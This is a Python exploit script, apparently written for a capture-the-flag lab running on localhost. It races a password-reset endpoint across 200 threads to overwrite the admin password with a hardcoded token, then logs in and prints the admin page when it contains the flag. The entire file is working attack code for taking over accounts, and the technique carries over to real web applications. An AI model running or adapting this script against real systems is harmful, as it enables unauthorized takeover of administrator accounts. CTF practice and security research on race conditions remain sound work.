# race_exploit.py
import requests
import threading
import sys
import time

TARGET = "http://127.0.0.1:5000/reset_password"
LOGIN = "http://127.0.0.1:5000/login"
ADMIN_USER = "admin"
TOKEN = "ADMIN-RESET-TOKEN-12345"   # change if your lab uses a different token
NEW_PASSWORD = "pwned_by_race"
NUM_THREADS = 200

success = False
lock = threading.Lock()

def attempt(i):
    global success
    data = {
        "username": ADMIN_USER,
        "token": TOKEN,
        "new_password": NEW_PASSWORD
    }
    try:
        r = requests.post(TARGET, data=data, timeout=3)
        # If server responds redirect to login, check if we can login with new password
        s = requests.Session()
        r2 = s.post(LOGIN, data={"username": ADMIN_USER, "password": NEW_PASSWORD}, allow_redirects=False)
        if r2.status_code in (302, 200):
            # check if login succeeded by requesting admin page
            admin_resp = s.get("http://127.0.0.1:5000/admin")
            if "CTF{" in admin_resp.text:
                with lock:
                    if not success:
                        success = True
                        print("[+] Got admin! thread:", i)
                        print(admin_resp.text)
    except Exception as e:
        pass

threads = []
for i in range(NUM_THREADS):
    t = threading.Thread(target=attempt, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

if not success:
    print("[-] Exploit failed â€” try increasing NUM_THREADS or repeat.")
